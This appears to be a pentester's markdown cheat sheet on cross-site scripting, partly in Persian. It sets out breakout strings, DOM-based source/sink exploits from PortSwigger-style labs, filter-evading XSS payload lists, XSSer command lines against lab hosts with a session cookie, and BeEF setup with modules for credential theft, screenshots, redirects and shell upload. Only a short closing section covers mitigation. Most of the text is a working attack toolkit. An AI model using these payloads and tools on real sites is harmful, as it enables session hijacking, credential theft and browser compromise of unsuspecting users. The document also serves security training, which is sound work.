# XSS

## Exploit (Reflected & Stored)
- تزریق کد به محتوای صفحه HTML بدون هیچ Encoding
  - ورودی های سایت مانند Search و Comment و ... 
  - پس از تزریق اسکریپت باید به page source code رفته و بررسی کنیم که با چه کاراکترهایی می توانیم از المانی که حاوی اسکریپت ما می باشد، breake out کنیم. چند نمونه در زیر آمده است:
```Javascript
">
'>
'">
'">');
/">
</title>
```
- س

## Exploit (DOM-based)
- تابع ```location.search``` برای *source* و ``` document.write ``` برای *sink*
```JavaScript
document.write('<img src="/resources/images/tracker.gif?searchTerms='+(new URLSearchParams(window.location.search)).get('search');+'">');
```
- تابع ```location.search``` برای *source* و ```innerHTML``` برای *sink*
  - در اینحالت محتوای search شده، درون صفحه نمایش داده می شود، که باید از تگ img برای تزریق payload استفاده می کنیم.
```JavaScript
document.getElementById('searchMessage').innerHTML = (new URLSearchParams(window.location.search)).get('search')
...
0 search results for '<span id="searchMessage"></span>'
``` 
- تابع ```location.search``` برای *source* و ```jQuery anchor href attribute``` برای *sink*
  - می خواهیم با کلیک روی کلید ```Back``` کوکی قربانی نمایش داده شود.
  - طبق کدهای زیر، پارامتر ```returnPath``` از URL خوانده شده و در href عه لینکی که به Back اشاره می کند، قرار داده می شود:
  - با تغییر URL و قرار دادن مقدار ```javascript:alert(document.cookie)``` برای پارامتر returnPath، با کلیک بر روی *Back*، کوکی کاربر نمایش داده می شود. 
```JavaScript
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
...
<a id="backLink">Back</a>
```
- رخداد ```hashchange``` و ```jQuery selector``` برای *sink*
  - طبق کد زیر، وبلاگ پس از لود شدن، بطور خودکار به شماره پستی که پس از علامت ```#``` درون URL نوشته شده است، می رود.
  - برای بهره برداری از این آسیب پذیری، از iframe نمایش داده شده استفاده می کنیم.
```Javascript
$(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
```
```Javascript
<iframe src="https://ac321f2a1f028348c0ab3eba003000ff.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe> 
```
- سی

## Payloads
```Javascript
<script>alert(888)</script>
<SCript>alert(888)</SCript>
<scri<script>pt>alert(888)</scri</script>pt>
<script>prompt(888)</script>
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 56, 56, 56, 41))</script>

<svg onload=alert(888)>

<img src=1 onerror=alert(888)>
<img src=1 oNeRrOr=alert`888`>

<BODY ONLOAD=alert(888)>
```

## Payloads
```Javascript
'; alert(888)'//
%27;+alert(888);//
";alert(888);//
";alert(888);"
';alert(888);//
';alert(888);'
```

## xsser
- POST
  - ```xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'```
    - XSSer will substitute payload in place of "XSS" string
    - ```p``` shows parameter in POST request (intercept request and copy parameter values from Burp) 
  - ```xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto```
    - Trying various XSS payloads by using XSSer's ```--auto``` option
  - ```xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"```
    - Using custom XSS payload 
- GET
  - ```xsser --url "http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote"```
  - ```xsser --url "http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"```
    - Providing basic XSS payload to XSSer
- Authenticated
  - ```xsser --url "http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit" --cookie="PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0"```
  - ```xsser --url "http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit" --cookie="PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0" --Fp "<script>alert(1)</script>"```
    - Scan the target using basic XSS payload

## BeEF

- Initialize
  - Install
    - ```apt update```
    - ```apt install beef-xss```
  - Change username/password
    -```nano /etc/beef-xss/config.yaml```

- Run
  - ```beef-xss```  
  - Browser => 127.0.0.1:3000/ui/panel

- Usage
  - 127.0.0.1:3000/hook.js
  - 192.168.8.106:3000/demos/basic.html

- Useful commands
  - Steal Credentials
    - Social Engineering -> Pretty Theft
  - Screenshot
    - Browser -> Spyder Eye     
  - Redirect 
    - Browser -> Hooked Domain -> Redirect Browser  
  - Shell Upload with update
    - Social Engineering -> Fake Notification Bar(Firefox)

## Mitigation
- Minimize the usage of user input on html
- Escape any untrusted input before inserting it into the page
  - ```&``` => ```&amp;```
  - ```<``` => ```&lt;```
  - ```>``` => ```&gt;```
  - ```"``` => ```&quot;```
  - ```'``` => ```&#x27;```
  - ```/``` => ```&#x2F;```
- [XSS-Prevention-CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) 
